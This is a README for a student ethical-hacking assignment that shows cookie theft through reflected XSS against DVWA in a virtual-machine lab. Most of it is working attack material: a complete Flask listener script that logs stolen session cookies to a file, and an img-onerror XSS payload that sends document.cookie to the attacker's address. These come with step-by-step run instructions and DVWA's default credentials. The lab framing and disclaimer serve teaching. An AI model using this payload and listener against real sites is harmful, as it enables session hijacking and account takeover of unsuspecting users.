# Cookie-Stealer

🕵️ Cookie Stealer via Reflected XSS | CSCI369 Ethical Hacking Assignment (Q2)
This project demonstrates a reflected XSS attack to steal session cookies from a vulnerable web application (DVWA) and send them to a Flask server running on the attacker's Kali Linux machine.

📘 Assignment Objective
"Write a Python program to receive a session cookie via a JavaScript XSS injection and save it with a timestamp. Use Flask on Kali to log cookies sent from DVWA (on Meta2)."

💻 What This Project Does
This project performs a simulated XSS attack in a controlled lab setup. You inject JavaScript into DVWA (hosted on Meta2) that runs in the victim’s browser and sends `document.cookie` to a Flask server running on Kali Linux. The Flask app listens on port 8080 and writes the stolen cookie to a file with a timestamp.

🧪 Lab Setup
VM              Role            Example IP
-------------   --------------  -----------------
Kali Linux      Attacker        10.0.2.15
Meta2 (DVWA)    Victim          10.0.2.4

🔧 How to Run the Flask Server
💡 Prerequisites
- Kali Linux VM with Python 3 and Flask installed
- Meta2 VM with DVWA accessible at http://10.0.2.4/dvwa
- Both VMs on the same NAT network

▶️ Flask Setup (on Kali)
```bash
sudo apt update
sudo apt install python3-venv -y

mkdir ~/myproject
cd ~/myproject
python3 -m venv venv
source venv/bin/activate
pip install Flask

# Save the stealer.py file below and run it:
python3 stealer.py
```

📄 Flask Code (stealer.py)
```python
# ================================================
# 🍪 Cookie Stealer Flask Server – CSCI369 Assignment Q2
# Sheethal Santhanam (Kali IP: 10.0.2.15)
# Description:
# This Flask app runs on the attacker's Kali VM.
# It receives cookies via an XSS payload from DVWA (Meta2 VM),
# then logs those cookies with a timestamp to cookies.txt.
# ================================================

from flask import Flask, request              # Flask handles incoming web requests
from datetime import datetime                 # Used to generate timestamps

# Initialize the Flask application
app = Flask(__name__)

# Define a route to receive GET requests at the root URL ("/")
@app.route('/')
def steal_cookie():
    # Try to extract the 'cookie' parameter from the URL query string
    cookie = request.args.get('cookie')

    # If a cookie value is received, process it
    if cookie:
        # Get the current date and time in a readable format
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Append the cookie and timestamp to a file named cookies.txt
        with open("cookies.txt", "a") as f:
            f.write(f"[{timestamp}] Cookie: {cookie}\n")

        # Send a basic response (victim won't see this during attack)
        return "Cookie received!"

    # If no cookie parameter was found in the request
    return "No cookie found."

# Start the Flask server:
# - host='0.0.0.0' allows connections from outside (Meta2 VM)
# - port=8080 is the server port the attacker listens on
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

💉 JavaScript XSS Payload (xss_payload.txt)
```html
<img src=x onerror="new Image().src='http://10.0.2.15:8080/?cookie='+document.cookie;">
```

📌 How to Test the Cookie Stealing Attack
1. Run Flask server on Kali
2. Visit DVWA at http://10.0.2.4/dvwa (from Kali browser)
3. Login: admin / password
4. Set DVWA Security to "Medium"
5. Navigate to "XSS (Reflected)"
6. Paste the payload above and click Submit
7. In another Kali terminal:
```bash
cd ~/myproject
cat cookies.txt
```
✅ You should see something like:
```
[2025-07-25 18:43:01] Cookie: PHPSESSID=xyz123; security=medium
```

🧠 How It Works
- The JavaScript runs inside DVWA and extracts `document.cookie`
- It silently sends the cookie via HTTP GET to the attacker’s Flask server
- The server logs the cookie in `cookies.txt` with a timestamp

📁 Folder Structure
Q2/
├── stealer.py         # Flask server script
├── xss_payload.txt    # Final JavaScript payload
├── README.txt         # This file

🛑 Disclaimer
This project is for educational purposes only in a controlled lab environment.
Never perform XSS attacks on real-world systems.
Unauthorized access is illegal.
